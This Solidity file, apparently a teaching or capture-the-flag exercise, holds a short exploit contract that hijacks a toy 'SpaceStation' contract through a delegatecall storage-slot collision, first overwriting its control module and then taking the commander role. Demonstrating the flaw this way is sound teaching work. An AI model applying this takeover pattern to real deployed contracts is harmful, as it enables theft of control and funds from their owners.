// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/**
 * @title SpacePirate
 * @notice A contract designed to exploit the SpaceStation contract and take control over it.
 * @dev Demonstrates the exploitation of the delegatecall vulnerability in the SpaceStation contract.
 * Follow the instructions to exploit the vulnerability and claim the station as your own.
 * @author Lucas Martin Calderon
 */

contract SpacePirate {
    address public controlModule;
    address public commander;
    uint public oxygenLevel;

    SpaceStation public targetStation;

    constructor(SpaceStation _targetStation) {
        targetStation = SpaceStation(_targetStation);
    }

    function hijackStation() public {
        targetStation.adjustOxygenLevel(uint(uint160(address(this))));
        targetStation.adjustOxygenLevel(1);
    }

    function adjustOxygenLevel(uint _level) public {
        commander = msg.sender;
    }
}
